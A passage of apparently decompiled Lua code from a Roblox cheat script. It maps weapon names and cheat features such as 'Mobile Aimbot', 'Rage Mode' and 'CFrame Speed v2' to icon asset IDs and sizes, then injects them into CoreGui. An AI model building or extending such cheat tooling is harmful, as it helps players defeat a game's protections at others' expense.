        size = UDim2.new(0, 460, 0, 150),
        parentSearchLevel = 3,
    },
    {
        text = 'Assault Rifle',
        imageID = 'rbxassetid://75480310531828',
        size = UDim2.new(0, 85, 0, 70),
        parentSearchLevel = 1,
    },
    {
        text = 'Revolver',
        imageID = 'rbxassetid://139314328910928',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Shorty',
        imageID = 'rbxassetid://78526355119022',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Handgun',
        imageID = 'rbxassetid://115137736353616',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'War Horn',
        imageID = 'rbxassetid://124249037297093',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Battle Axe',
        imageID = 'rbxassetid://76119809648393',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Energy Rifle',
        imageID = 'rbxassetid://81903267328044',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Freeze Ray',
        imageID = 'rbxassetid://134874010520949',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Daggers',
        imageID = 'rbxassetid://124386216191091',
        size = UDim2.new(0, 55, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Shotgun',
        imageID = 'rbxassetid://78473164525526',
        size = UDim2.new(0, 60, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Knife',
        imageID = 'rbxassetid://104596122491630',
        size = UDim2.new(0, 65, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Bow',
        imageID = 'rbxassetid://96393141301809',
        size = UDim2.new(0, 65, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Scythe',
        imageID = 'rbxassetid://73808098299850',
        size = UDim2.new(0, 65, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Grenade',
        imageID = 'rbxassetid://124575019523024',
        size = UDim2.new(0, 65, 0, 60),
        parentSearchLevel = 1,
    },
    {
        text = 'Molotov',
        imageID = 'rbxassetid://122186700784805',
        size = UDim2.new(0, 65, 0, 60),
        parentSearchLevel = 1,
    },
    {
        text = 'RPG',
        imageID = 'rbxassetid://77997465931263',
        size = UDim2.new(0, 65, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Burst Rifle',
        imageID = 'rbxassetid://133334115423599',
        size = UDim2.new(0, 65, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Sniper',
        imageID = 'rbxassetid://106125986986438',
        size = UDim2.new(0, 65, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Riot Shield',
        imageID = 'rbxassetid://100658552625628',
        size = UDim2.new(0, 65, 0, 55),
        parentSearchLevel = 1,
    },
    {
        text = 'Mobile Aimbot',
        imageID = 'rbxassetid://10734963940',
        size = UDim2.new(0, 25, 0, 25),
        parentSearchLevel = 1,
    },
    {
        text = 'CFrame Speed v2',
        imageID = 'rbxassetid://120488376434713',
        size = UDim2.new(0, 30, 0, 30),
        parentSearchLevel = 1,
    },
    {
        text = 'Gunmods <font color="#52e2ff"> [New]</font>',
        imageID = 'rbxassetid://106917358077603',
        size = UDim2.new(0, 7, 0, 7),
        parentSearchLevel = 1,
    },
    {
        text = 'Aim Features <font color="#52ff7d"> [UPD]</font>',
        imageID = 'rbxassetid://106917358077603',
        size = UDim2.new(0, 7, 0, 7),
        parentSearchLevel = 1,
    },
    {
        text = 'Rage Mode',
        imageID = 'rbxassetid://106917358077603',
        size = UDim2.new(0, 5, 0, 5),
        parentSearchLevel = 1,
    },
    {
        text = 'Get Public configs',
        imageID = 'rbxassetid://10723398002',
        size = UDim2.new(0, 35, 0, 35),
        parentSearchLevel = 1,
    },
    {
        text = 'Fists',
        imageID = 'rbxassetid://81437646829280',
        size = UDim2.new(0, 35, 0, 35),
        parentSearchLevel = 1,
    },
    {
        text = 'Bullet Tracer',
        imageID = 'rbxassetid://99844639964801',
        size = UDim2.new(0, 465, 0, 160),
        parentSearchLevel = 3,
    },
    {
        text = 'Select smartly?',
        imageID = 'rbxassetid://95101678284941',
        size = UDim2.new(0, 250, 0, 25),
        parentSearchLevel = 1,
    },
}
local v1035, v1036, v1037 = ipairs(v1034)
local v1038 = u1033

while true do
    local v1039

    v1037, v1039 = v1035(v1036, v1037)

    if v1037 == nil then
        break
    end

    v1038(_CoreGui4, v1039.text, v1039.imageID, v1039.size, v1039.parentSearchLevel)
end

v62:Minimize()
print('success')
